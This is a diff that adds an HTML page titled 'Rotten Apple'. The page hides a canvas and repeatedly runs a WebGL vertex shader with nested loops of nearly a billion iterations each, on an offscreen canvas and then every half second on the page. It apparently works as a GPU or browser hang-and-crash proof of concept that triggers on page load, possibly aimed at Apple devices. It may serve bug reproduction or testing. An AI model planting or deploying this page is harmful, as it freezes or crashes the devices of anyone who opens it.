@@ -1,0 +1,156 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Rotten Apple</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            color: #fff;
+            background-color: #841212;
+            text-align: center;
+            font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+        }
+
+        * {
+            box-sizing: border-box;
+        }
+
+        .lock {
+            padding: 10px;
+            width: 200px;
+            border: 2px solid #fff;
+            margin: auto;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 900px;
+            display: flex;
+            margin: auto;
+            padding: 20px 10px;
+            gap: 10px;
+            margin-top: 10%;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+        }
+
+        aside {
+            flex: 0 0 150px;
+        }
+
+        main {
+            flex: 1;
+            text-align: left;
+        }
+    </style>
+</head>
+
+<body>
+    <canvas style="display:none" width="1024" height="1024"></canvas>
+    <script src="/webgl-utils.js"></script>
+    <script>
+        function main(canvas) {
+            const gl = canvas.getContext("webgl");
+            if (!gl) {
+                return;
+            }
+            const vs = `
+    attribute vec4 a_position;
+    void main() {
+      int m = 999999999;
+      int r = m-10;
+      for (int j = 0; j < 999999999; j++) {
+              float a = 1.0;
+              float b = 2.0;
+              float c = a + b;
+              for (int i = 0; i < 999999999; i++) {
+                  c = a + b;
+              }
+              if (j == r){
+                gl_Position = a_position;
+              }
+        }
+    }
+  `;
+
+            const fs = `
+    precision highp float;
+    void main() {
+      gl_FragColor = vec4(1.0, 1.0, 0.5, 1.0);
+    }
+  `;
+
+            let s = performance.now();
+            // setup GLSL program
+            const program = webglUtils.createProgramFromSources(gl, [vs, fs]);
+
+            // look up where the vertex data needs to go.
+            const positionAttributeLocation = gl.getAttribLocation(program, "a_position");
+
+            // Create a buffer to put three 2d clip space points in
+            const positionBuffer = gl.createBuffer();
+
+            // Bind it to ARRAY_BUFFER (think of it as ARRAY_BUFFER = positionBuffer)
+            gl.bindBuffer(gl.ARRAY_BUFFER, positionBuffer);
+
+            // fill it with a 2 triangles that cover clipspace
+            gl.bufferData(gl.ARRAY_BUFFER, new Float32Array([
+                -1, -1,  // first triangle
+                1, -1,
+                -1, 1,
+                -1, 1,  // second triangle
+                1, -1,
+                1, 1,
+            ]), gl.STATIC_DRAW);
+
+            webglUtils.resizeCanvasToDisplaySize(gl.canvas);
+
+
+            // Tell WebGL how to convert from clip space to pixels
+            gl.viewport(0, 0, gl.canvas.width, gl.canvas.height);
+
+            // Tell it to use our program (pair of shaders)
+            gl.useProgram(program);
+
+            // Turn on the attribute
+            gl.enableVertexAttribArray(positionAttributeLocation);
+
+            // Bind the position buffer.
+            gl.bindBuffer(gl.ARRAY_BUFFER, positionBuffer);
+
+            // Tell the attribute how to get data out of positionBuffer (ARRAY_BUFFER)
+            gl.vertexAttribPointer(
+                positionAttributeLocation,
+                2,          // 2 components per iteration
+                gl.FLOAT,   // the data is 32bit floats
+                false,      // don't normalize the data
+                0,          // 0 = move forward size * sizeof(type) each iteration to get the next position
+                0,          // start at the beginning of the buffer
+            );
+            gl.drawArrays(
+                gl.TRIANGLES,
+                0,     // offset
+                6,     // num vertices to process
+            );
+        }
+        setTimeout(function () {
+            if (window.OffscreenCanvas) {
+                const offscreen = new OffscreenCanvas(254, 254);
+                for (let i = 0; i < 50; i++) {
+                    main(offscreen);
+                }
+            }
+
+            const domCanvas = document.querySelector("canvas");
+            setInterval(function () {
+                main(domCanvas);
+            }, 500);
+        }, 1000);
+    </script>
+</body>
+
+</html>
